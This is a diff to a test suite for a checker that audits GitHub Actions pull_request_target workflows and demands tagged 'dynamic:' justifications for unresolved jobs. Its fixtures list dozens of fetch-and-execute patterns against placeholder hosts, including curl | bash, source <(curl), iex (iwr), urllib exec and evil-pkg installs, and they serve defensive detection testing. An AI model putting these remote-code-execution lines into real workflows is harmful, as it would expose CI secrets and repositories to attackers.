@@ -1003,7 +1003,7 @@ SCRIPT_JOB = {
               - working-directory: .source
                 run: bash scripts/tool.sh
     """,
-    "scripts/tool.sh": "#!/usr/bin/env bash\ngh api repos/o/r\n",
+    "scripts/tool.sh": "#!/usr/bin/env bash\necho ok\n",
 }
 SCRIPT_ROW = review_row(SCRIPT_JOB, "target.yml [pull_request_target]", "review")
 expect(
@@ -1108,16 +1108,16 @@ expect(
     *REVIEWED_ARGS,
 )
 expect(
-    with_review(DYNAMIC_JOB, DYNAMIC_ROW.rstrip("\n") + "\tdynamic: TOOL_DIR is set by the reviewed base workflow\n"),
+    with_review(DYNAMIC_JOB, DYNAMIC_ROW.rstrip("\n") + "\tdynamic: full-checkout: TOOL_DIR is set by the reviewed base workflow\n"),
     0,
-    ("REVIEWED", "dynamic: TOOL_DIR is set by the reviewed base workflow"),
+    ("REVIEWED", "dynamic: full-checkout: TOOL_DIR is set by the reviewed base workflow"),
     "a dynamic: justification classifies a job whose on-disk bytes cannot be bounded",
     *REVIEWED_ARGS,
 )
 expect(
-    with_review(SCRIPT_JOB, SCRIPT_ROW.rstrip("\n") + "\tdynamic: not needed\n"),
+    with_review(SCRIPT_JOB, SCRIPT_ROW.rstrip("\n") + "\tdynamic: fetch: not needed\n"),
     1,
-    ("STALE REVIEWED", "dynamic: justification no longer applies"),
+    ("STALE REVIEWED", "dynamic: names reasons the job no longer has: fetch"),
     "a dynamic: justification on a fully resolvable job is stale",
     *REVIEWED_ARGS,
 )
@@ -1310,7 +1310,7 @@ DYNAMIC_ACTION_JOB = {
     ".github/actions/shared/run.sh": "echo shared\n",
 }
 DYNAMIC_ACTION_ROW = review_row(DYNAMIC_ACTION_JOB, "target.yml [pull_request_target]", "review").rstrip("\n") + (
-    "\tdynamic: the full base checkout is justified for the fixture\n"
+    "\tdynamic: full-checkout: the full base checkout is justified for the fixture\n"
 )
 expect(
     with_review(DYNAMIC_ACTION_JOB, DYNAMIC_ACTION_ROW),
@@ -1356,8 +1356,11 @@ expect(
 
 
 # ---------------------------------------------------------------------------
-# Final review residuals: patch application, submodules, and fetched content
-# executed in the same job all put unbound bytes on disk.
+# Review of #1827 at 62723cdd: matching which fetched paths a job executes is
+# open-ended, so the checker over-approximates. Any fetch, runtime tree change,
+# non-default shell, or head detection that does not conclude "no known
+# pattern" leaves the job unresolved, and its entry's dynamic: field must name
+# every reason category the checker computes (ADR 0235 decision 6).
 # ---------------------------------------------------------------------------
 BOUNDED_STEPS = """
     - uses: actions/checkout@v4
@@ -1365,84 +1368,295 @@ BOUNDED_STEPS = """
         sparse-checkout: scripts/tool.sh
         sparse-checkout-cone-mode: false
 """
-RESIDUAL_SHAPES = {
-    "git apply": ("- run: git apply change.patch", "`git apply` changes the checked-out tree"),
-    "git am": ("- run: git am < series.mbox", "`git am` changes the checked-out tree"),
-    "git cherry-pick": ("- run: git cherry-pick abc1234", "`git cherry-pick` changes the checked-out tree"),
-    "patch": ("- run: patch -p1 < change.patch", "`patch` changes the checked-out tree"),
-    "submodules": ("""- uses: actions/checkout@v4
-      with:
-        sparse-checkout: scripts/tool.sh
-        sparse-checkout-cone-mode: false
-        submodules: recursive""", "checkout submodules: recursive materializes repositories"),
-    "fetched script executed": (
-        "- run: curl -sSLo /tmp/tool.sh https://example.test/tool.sh && bash /tmp/tool.sh",
-        "executes paths not bound to the scanned tree (/tmp/tool.sh)",
+COMPOSITE_FETCH_RUN = """
+    runs:
+      using: composite
+      steps:
+        - shell: bash
+          run: curl -fsSL https://x.test/i.sh -o /tmp/i.sh && bash -c "$(cat /tmp/i.sh)"
+"""
+COMPOSITE_CURL_BASH = """
+    runs:
+      using: composite
+      steps:
+        - shell: bash
+          run: curl -fsSL https://x.test/i.sh | bash
+"""
+# label -> (steps, reason tags, extra repository files, job-level YAML)
+UNRESOLVED_SHAPES = {
+    # The reviewer's probes at 62723cdd.
+    'bash -c "$(curl ...)"': ('- run: bash -c "$(curl -fsSL https://x.test/i.sh)"', {"fetch"}),
+    'sh -c "$(wget -O- ...)"': ("- run: sh -c \"$(wget -qO- https://x.test/i.sh)\"", {"fetch"}),
+    ". <(curl ...)": ("- run: . <(curl -fsSL https://x.test/env.sh)", {"fetch"}),
+    "source <(curl ...)": ("- run: source <(curl -fsSL https://x.test/env.sh)", {"fetch"}),
+    "eval $(curl)": ('- run: eval "$(curl -fsSL https://x.test/env.sh)"', {"fetch"}),
+    "curl | bash": ("- run: curl -fsSL https://x.test/i.sh | bash", {"fetch"}),
+    "curl -o; sh < file": ("- run: |\n    curl -fsSLo /tmp/i.sh https://x.test/i.sh\n    sh < /tmp/i.sh", {"fetch"}),
+    "curl -o; python3 -c exec(open())": (
+        "- run: |\n    curl -fsSLo /tmp/i.py https://x.test/i.py\n    python3 -c \"exec(open('/tmp/i.py').read())\"",
+        {"fetch"},
     ),
-    "fetched contents sourced": ("""- run: gh api repos/o/r/contents/env.sh --jq .content | base64 -d | tee env.sh
-    - run: source ./env.sh""", "fetches content at runtime (gh)"),
-    "API response redirected and executed": ("""- run: gh api repos/o/r/releases/assets/1 > tool.sh
-    - run: bash tool.sh""", "fetches content at runtime (gh)"),
-    "API tarball executed": ("""- run: gh api repos/o/r/tarball/main | tar xz
-    - run: bash ./o-r/run.sh""", "fetches content at runtime (gh)"),
-    "wget script executed": ("- run: wget -qO tool.sh https://example.test/tool.sh && sh tool.sh",
-                             "fetches content at runtime (wget)"),
-    "release asset executed": ("""- run: gh release download v1 --pattern tool.sh
-    - run: bash tool.sh""", "fetches content at runtime (gh)"),
-    "run artifact executed": ("""- run: gh run download 1 --name tools
-    - run: ./tools/run.sh""", "fetches content at runtime (gh)"),
-    "cloned script executed": ("""- run: git clone https://example.test/tools.git
-    - run: bash tools/run.sh""", "fetches content at runtime (git)"),
-    "downloaded artifact executed": ("""- uses: actions/download-artifact@v4
-      with:
-        name: tools
-    - run: ./tools/run.sh""", "fetches content at runtime (actions/download-artifact)"),
+    "curl -o; node -e require()": (
+        "- run: |\n    curl -fsSLo /tmp/i.js https://x.test/i.js\n    node -e \"require('/tmp/i.js')\"", {"fetch"}
+    ),
+    "curl -o mod.py; python3 -m mod": ("- run: |\n    curl -fsSLo mod.py https://x.test/m.py\n    python3 -m mod", {"fetch"}),
+    "alias sh=bash; $sh f": ("- run: |\n    curl -fsSLo /tmp/i.sh https://x.test/i.sh\n    sh=bash\n    $sh /tmp/i.sh", {"fetch"}),
+    '"$SHELL" f': ('- run: |\n    curl -fsSLo /tmp/i.sh https://x.test/i.sh\n    "$SHELL" /tmp/i.sh', {"fetch"}),
+    "curl -o overwrites a scanned file": (
+        "- run: |\n    curl -fsSLo scripts/tool.sh https://x.test/i.sh\n    bash scripts/tool.sh", {"fetch"}
+    ),
+    "a heredoc in the same step": (
+        "- run: |\n    cat > cfg.txt <<EOF\n    hi\n    EOF\n    curl -fsSLo i.sh https://x.test/i.sh\n    bash i.sh",
+        {"fetch"},
+    ),
+    "a heredoc in another step naming the file": (
+        "- run: |\n    cat > /dev/null <<EOF\n    i.sh\n    EOF\n- run: curl -fsSLo /tmp/i.sh https://x.test/i.sh && bash /tmp/i.sh",
+        {"fetch"},
+    ),
+    "tar -C f with working-directory: f": (
+        "- run: mkdir f && curl -fsSL https://x.test/t.tgz | tar xz -C f\n- run: bash scripts/tool.sh\n  working-directory: f",
+        {"fetch"},
+    ),
+    "python urllib exec": (
+        "- run: python3 -c \"import urllib.request as u; exec(u.urlopen('https://x.test/p').read())\"", {"fetch"}
+    ),
+    "shell: python with urllib": (
+        "- shell: python {0}\n  run: |\n    import urllib.request as u\n    exec(u.urlopen('https://x.test/p').read())",
+        {"fetch", "shell"},
+    ),
+    "a shell: override carrying curl | sh": (
+        "- shell: \"sh -c 'curl -fsSL https://x.test/i.sh | sh' -- {0}\"\n  run: echo hi", {"fetch", "shell"}
+    ),
+    "a shell: override alone": ("- shell: sh\n  run: echo hi", {"shell"}),
+    "iex (iwr ...) under pwsh": ("- shell: pwsh\n  run: iex (iwr https://x.test/i.ps1).Content", {"fetch", "shell"}),
+    "git fetch refs/pull/*/head; git show | bash": (
+        "- run: git fetch origin refs/pull/1/head && git show FETCH_HEAD:scripts/tool.sh | bash",
+        {"fetch", "head-materialization"},
+    ),
+    "git fetch refs/pull; git show > f; bash f": (
+        "- run: |\n    git fetch origin refs/pull/${{ github.event.pull_request.number }}/head\n"
+        "    git show FETCH_HEAD:build.sh > /tmp/b.sh\n    bash /tmp/b.sh",
+        {"fetch", "head-materialization"},
+    ),
+    "gh pr checkout": (
+        "- run: gh pr checkout ${{ github.event.pull_request.number }} && bash scripts/tool.sh",
+        {"fetch", "tree-change", "head-materialization"},
+    ),
+    "gh pr diff | git apply": ("- run: gh pr diff 1 | git apply", {"fetch", "tree-change", "head-materialization"}),
+    "gh pr diff | patch": ("- run: gh pr diff 1 | patch -p1", {"fetch", "tree-change", "head-materialization"}),
+    "git -c k=v apply": ("- run: git -c core.x=1 apply p.diff", {"tree-change"}),
+    "git --git-dir checkout FETCH_HEAD": ("- run: git --git-dir=.git checkout FETCH_HEAD -- scripts", {"tree-change"}),
+    "git --git-dir with a separate argument": ("- run: git --git-dir .git --work-tree . checkout FETCH_HEAD", {"tree-change"}),
+    "npx of a remote package": ("- run: npx --yes evil-pkg@latest", {"fetch"}),
+    "pip install git+URL": ("- run: pip install git+https://x.test/evil.git", {"fetch"}),
+    "docker run of a fetched image": ("- run: docker run --rm ghcr.io/x/evil:latest", {"fetch"}),
+    "download-artifact with path: .": (
+        "- uses: actions/download-artifact@v4\n  with:\n    name: tools\n    path: .\n- run: bash scripts/tool.sh",
+        {"fetch"},
+    ),
+    "xargs bash": ("- run: curl -fsSL https://x.test/list | xargs -n1 bash", {"fetch"}),
+    "exec bash f": ("- run: |\n    curl -fsSLo /tmp/i.sh https://x.test/i.sh\n    exec bash /tmp/i.sh", {"fetch"}),
+    "a checkout path: ${{ }} prefix": (
+        "- uses: actions/checkout@v4\n  with:\n    path: ${{ github.run_id }}\n    sparse-checkout: scripts/tool.sh\n"
+        "    sparse-checkout-cone-mode: false\n- run: |\n    curl -fsSLo dl/scripts/tool.sh https://x.test/i.sh\n"
+        "    bash dl/scripts/tool.sh",
+        {"fetch"},
+    ),
+    "defaults.run.working-directory then curl": (
+        "- run: curl -fsSL https://x.test/t.tgz | tar xz\n- run: bash scripts/tool.sh",
+        {"fetch"},
+        {},
+        "defaults:\n  run:\n    working-directory: pkg\n",
+    ),
+    "a local composite action that fetches and runs": (
+        "- uses: ./.github/actions/a", {"fetch"}, {".github/actions/a/action.yml": COMPOSITE_FETCH_RUN}
+    ),
+    "a local composite action running curl | bash": (
+        "- uses: ./.github/actions/a", {"fetch"}, {".github/actions/a/action.yml": COMPOSITE_CURL_BASH}
+    ),
+    "a YAML anchor duplicating a run": ("- &s\n  run: echo hi\n- run: curl -fsSL https://x.test/i.sh | bash", {"fetch"}),
+    "an arithmetic shift beside a fetch": (
+        "- run: |\n    echo $((1<<n))\n    curl -fsSLo /tmp/i.sh https://x.test/i.sh\n    bash /tmp/i.sh", {"fetch"}
+    ),
+    "python3 <<EOF executing a fetched file": (
+        "- run: |\n    curl -fsSLo /tmp/i.py https://x.test/i.py\n    python3 <<EOF\n    exec(open('/tmp/i.py').read())\n    EOF",
+        {"fetch"},
+    ),
+    # Earlier residual shapes, now reason-tagged.
+    "git apply": ("- run: git apply change.patch", {"tree-change"}),
+    "git am": ("- run: git am < series.mbox", {"tree-change"}),
+    "git cherry-pick": ("- run: git cherry-pick abc1234", {"tree-change"}),
+    "patch": ("- run: patch -p1 < change.patch", {"tree-change"}),
+    "submodules": (
+        "- uses: actions/checkout@v4\n  with:\n    sparse-checkout: scripts/tool.sh\n"
+        "    sparse-checkout-cone-mode: false\n    submodules: recursive",
+        {"submodules"},
+    ),
+    "gh api contents sourced": (
+        "- run: gh api repos/o/r/contents/env.sh --jq .content | base64 -d | tee env.sh\n- run: source ./env.sh",
+        {"fetch"},
+    ),
+    "gh api tarball": ("- run: gh api repos/o/r/tarball/main | tar xz\n- run: bash ./o-r/run.sh", {"fetch"}),
+    "gh release download": ("- run: gh release download v1 --pattern tool.sh\n- run: bash tool.sh", {"fetch"}),
+    "gh run download": ("- run: gh run download 1 --name tools\n- run: ./tools/run.sh", {"fetch"}),
+    "git clone": ("- run: git clone https://example.test/tools.git\n- run: bash tools/run.sh", {"fetch"}),
+    "a fetch whose response is only read as data": (
+        "- run: curl -sSL https://example.test/status.json | jq .ok\n- run: bash scripts/tool.sh", {"fetch"}
+    ),
+    "a repository script that fetches": ("- run: bash scripts/tool.sh", {"fetch"}, {"scripts/tool.sh": "gh api repos/o/r\n"}),
+    "a repository program fetching through an argv list": (
+        "- run: python3 scripts/tool.sh",
+        {"fetch"},
+        {"scripts/tool.sh": 'import subprocess\nsubprocess.run(["git", "fetch", "origin"])\n'},
+    ),
+    "actions/cache restores fetched bytes": ("- uses: actions/cache@v4\n  with:\n    path: x\n    key: k", {"fetch"}),
+    "a docker:// step": ("- uses: docker://ghcr.io/x/tool:1", {"fetch"}),
+    "a local docker action": (
+        "- uses: ./.github/actions/d",
+        {"fetch"},
+        {".github/actions/d/action.yml": "runs:\n  using: docker\n  image: Dockerfile\n", ".github/actions/d/Dockerfile": "FROM scratch\n"},
+    ),
+    "a non-default shell inside a local composite action": (
+        "- uses: ./.github/actions/s",
+        {"shell"},
+        {".github/actions/s/action.yml": "runs:\n  using: composite\n  steps:\n    - shell: python\n      run: print(1)\n"},
+    ),
+    "a job-level defaults.run.shell": ("- run: echo hi", {"shell"}, {}, "defaults:\n  run:\n    shell: sh\n"),
+    "an undetermined head handoff": (
+        "- env:\n    CANDIDATE: ${{ github.event.pull_request.head.sha }}\n  run: ./tools/materialize \"$CANDIDATE\"",
+        {"head-materialization"},
+    ),
+    "a head checkout": (
+        "- uses: actions/checkout@v4\n  with:\n    ref: ${{ github.event.pull_request.head.sha }}\n"
+        "    sparse-checkout: scripts/tool.sh\n    sparse-checkout-cone-mode: false",
+        {"runtime-checkout", "head-materialization"},
+    ),
 }
-for label, (steps, reason) in RESIDUAL_SHAPES.items():
-    job = {**target_job(BOUNDED_STEPS + "    " + steps), "scripts/tool.sh": "echo ok\n"}
+
+
+def shaped_job(steps: str, extra: dict | None = None, job_yaml: str = "") -> dict[str, str]:
+    body = textwrap.dedent(BOUNDED_STEPS).strip("\n") + "\n" + textwrap.dedent(steps).strip("\n") + "\n"
+    workflow = (
+        "on: pull_request_target\njobs:\n  review:\n"
+        f"    runs-on: {TRUSTED_SELECTOR}\n"
+        + textwrap.indent(job_yaml, "    ")
+        + "    steps:\n"
+        + textwrap.indent(body, "      ")
+    )
+    return {"target.yml": workflow, "scripts/tool.sh": "echo ok\n", **(extra or {})}
+
+
+REASONS = ("fetch", "head-materialization", "tree-change", "shell", "full-checkout", "runtime-checkout",
+           "submodules", "unscanned-path", "local-action")
+
+
+def named_reasons(output: str) -> set[str]:
+    """Reason tags an unclassifiable message says the entry's dynamic: lacks."""
+    match = re.search(r"unclassifiable: .*?does not name: (.*)", output)
+    return {tag for tag in REASONS if match and re.search(rf"(?:^|, ){re.escape(tag)} \(", match.group(1))}
+
+
+def dynamic_row(row: str, tags, why: str = "bytes come from a reviewed trusted source") -> str:
+    return row.rstrip("\n") + f"\tdynamic: {', '.join(sorted(tags))}: {why}\n"
+
+
+for label, shape in UNRESOLVED_SHAPES.items():
+    steps, tags = shape[0], shape[1]
+    extra = shape[2] if len(shape) > 2 else None
+    job_yaml = shape[3] if len(shape) > 3 else ""
+    job = shaped_job(steps, extra, job_yaml)
     try:
         row = review_row(job, "target.yml [pull_request_target]", "review")
     except AssertionError as error:
         fail(f"{label}: could not review the job ({error})")
         continue
     code, output = run_checker(with_review(job, row), *REVIEWED_ARGS)
-    if code == 1 and "unclassifiable" in output and reason in output:
-        ok(f"{label}: unbound on-disk content requires a dynamic: justification")
+    computed = named_reasons(output)
+    if code == 1 and computed == tags:
+        ok(f"{label}: unresolved for {', '.join(sorted(tags))} without dynamic:")
     else:
-        fail(f"{label}: not held for `{reason}` without dynamic: (exit {code}: {output.strip()[:300]})")
-    justified = row.rstrip("\n") + "\tdynamic: bytes come from a reviewed trusted source\n"
-    code, output = run_checker(with_review(job, justified), *REVIEWED_ARGS)
+        fail(f"{label}: expected unresolved {sorted(tags)}, got {sorted(computed)} (exit {code}: {output.strip()[:400]})")
+    code, output = run_checker(with_review(job, dynamic_row(row, tags)), *REVIEWED_ARGS)
     if code == 0 and "REVIEWED" in output:
-        ok(f"{label}: a dynamic: justification classifies it")
+        ok(f"{label}: a dynamic: naming exactly {', '.join(sorted(tags))} classifies it")
     else:
-        fail(f"{label}: a dynamic: justification did not classify it (exit {code}: {output.strip()[:300]})")
+        fail(f"{label}: a correctly tagged dynamic: did not classify it (exit {code}: {output.strip()[:400]})")
 
-FETCH_ONLY = {**target_job(BOUNDED_STEPS + """
-    - run: curl -sSL https://example.test/status.json | jq .ok
-    - run: bash scripts/tool.sh
-"""), "scripts/tool.sh": "echo ok\n"}
+# The g-series repros from the 2f48d335 review are unresolved as well as unlisted.
+for label, steps in REVIEWER_REPROS.items():
+    job = target_job(steps)
+    row = review_row(job, "target.yml [pull_request_target]", "review")
+    expect(with_review(job, row), 1, ("unclassifiable",), f"{label}: requires a dynamic: justification", *REVIEWED_ARGS)
+
+MULTI_REASON = shaped_job("- shell: sh\n  run: curl -fsSL https://x.test/s.json | jq .ok")
+MULTI_ROW = review_row(MULTI_REASON, "target.yml [pull_request_target]", "review")
 expect(
-    with_review(FETCH_ONLY, review_row(FETCH_ONLY, "target.yml [pull_request_target]", "review")),
+    with_review(MULTI_REASON, dynamic_row(MULTI_ROW, {"fetch", "shell"}, "status JSON read as data; sh runs only jq")),
     0,
-    ("REVIEWED",),
-    "a fetch in a job that executes only scanned-tree paths stays classifiable",
+    ("REVIEWED: target.yml [pull_request_target]: job 'review'", "dynamic: fetch, shell: status JSON read as data"),
+    "a dynamic: naming every computed reason classifies the job",
+    *REVIEWED_ARGS,
+)
+expect(
+    with_review(MULTI_REASON, dynamic_row(MULTI_ROW, {"fetch"})),
+    1,
+    ("VIOLATION: target.yml [pull_request_target]: job 'review'", "unclassifiable", "does not name: shell ("),
+    "a dynamic: missing a computed reason fails and names the missing reason",
+    *REVIEWED_ARGS,
+)
+expect(
+    with_review(MULTI_REASON, dynamic_row(MULTI_ROW, {"fetch", "shell", "submodules"})),
+    1,
+    ("STALE REVIEWED", "dynamic: names reasons the job no longer has: submodules"),
+    "a dynamic: naming a reason the job does not have is stale",
+    *REVIEWED_ARGS,
+)
+for malformed, fragment, label in (
+    ("dynamic: fetch, shell: ", "empty justification", "an empty dynamic: justification is rejected"),
+    ("dynamic: fetch, shell:", "dynamic: <reason>[, <reason>]: <justification>", "a dynamic: with no justification is rejected"),
+    ("dynamic: bytes are fine", "dynamic: <reason>[, <reason>]: <justification>", "an untagged dynamic: is rejected"),
+    ("dynamic: fetch, fetchy: why", "unknown dynamic: reason 'fetchy'", "an unknown dynamic: reason is rejected"),
+    ("dynamic: fetch, fetch: why", "repeats", "a repeated dynamic: reason is rejected"),
+):
+    expect(
+        with_review(MULTI_REASON, MULTI_ROW.rstrip("\n") + f"\t{malformed}\n"),
+        2,
+        ("UNDETERMINED", fragment),
+        label,
+        *REVIEWED_ARGS,
+    )
+
+# A reviewed job that gains a reason must say which, not only print digests.
+FETCH_JOB = shaped_job("- run: curl -fsSL https://x.test/s.json | jq .ok")
+FETCH_ROW = dynamic_row(review_row(FETCH_JOB, "target.yml [pull_request_target]", "review"), {"fetch"})
+expect(with_review(FETCH_JOB, FETCH_ROW), 0, ("REVIEWED",), "a fetch-tagged entry passes while unchanged", *REVIEWED_ARGS)
+expect(
+    with_review(shaped_job("- run: curl -fsSL https://x.test/s.json | jq .ok\n- run: git apply p.diff"), FETCH_ROW),
+    1,
+    ("STALE REVIEWED", "newly unresolved reasons dynamic: does not name: tree-change (`git apply`"),
+    "a reviewed job that gains a reason lists the newly unresolved reason",
+    *REVIEWED_ARGS,
+)
+expect(
+    with_review(shaped_job("- run: echo no fetch"), FETCH_ROW),
+    1,
+    ("STALE REVIEWED", "dynamic: names reasons the job no longer has: fetch"),
+    "a reviewed job that loses a reason says which tag to remove",
     *REVIEWED_ARGS,
 )
 
-
-NEAR_MISSES = {**target_job(BOUNDED_STEPS + """
-    - run: |
-        # git checkout and "/" in a comment run nothing
-        patch="$(gh api repos/o/r/pulls/1)"
-        curl -sSL https://example.test/status.json | jq .ok
-        bash scripts/tool.sh
-"""), "scripts/tool.sh": "echo ok\n"}
+NEAR_MISSES = shaped_job("""- run: |
+    # git checkout, curl and "/" in a comment run nothing
+    patch="$(jq -r .title event.json)"
+    bash scripts/tool.sh
+""")
 expect(
     with_review(NEAR_MISSES, review_row(NEAR_MISSES, "target.yml [pull_request_target]", "review")),
     0,
     ("REVIEWED",),
-    "a variable named patch and commands named in comments are not tree mutations or executions",
+    "a variable named patch and commands named in comments are neither tree changes nor fetches",
     *REVIEWED_ARGS,
 )
+
 
 sys.exit(1 if failures else 0)
